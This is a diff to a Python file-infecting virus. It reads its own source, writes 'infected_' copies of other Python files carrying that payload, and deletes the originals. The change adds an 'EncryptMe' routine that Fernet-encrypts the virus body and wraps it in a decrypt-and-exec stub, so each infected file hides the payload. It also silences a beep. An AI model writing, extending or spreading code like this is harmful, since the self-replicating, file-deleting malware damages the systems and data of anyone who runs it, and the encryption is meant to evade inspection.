@@ -34,7 +34,8 @@ def infect(PAYLOAD):
         if f.mode == 'r' and x == None:
             f.seek(0)
             infected = open('infected_'+str(i)+'.py','w')
-            infected.write("_x = " + str(PAYLOAD) + str(f.read()))
+            infected.write('from cryptography.fernet import Fernet\n')
+            infected.write(EncryptMe(PAYLOAD) + str(f.read()))
             f.close()
             infected.close()
             os.remove(file)
@@ -47,16 +48,19 @@ def infect(PAYLOAD):
 with open(__file__,'r') as current_file:
     PAYLOAD = current_file.read()
 
+def EncryptMe(virus):
+
+    virus = virus.encode()
+    key = Fernet.generate_key()
+    obj = Fernet(key)
+    virus = obj.encrypt(virus)
 
 
+    PAYLOAD = "encrypted_virus = {0}\nobj = Fernet({1})\n_virus = obj.decrypt(encrypted_virus)\nexec(_virus)".format(virus,key)
+    return str(PAYLOAD)
 
-
-PAYLOAD = PAYLOAD.encode()
-key = Fernet.generate_key()
-obj = Fernet(key)
-PAYLOAD = obj.encrypt(PAYLOAD)
 
 
 infect(PAYLOAD)
-Beep(FREQ,DUR)
+#Beep(FREQ,DUR)
 
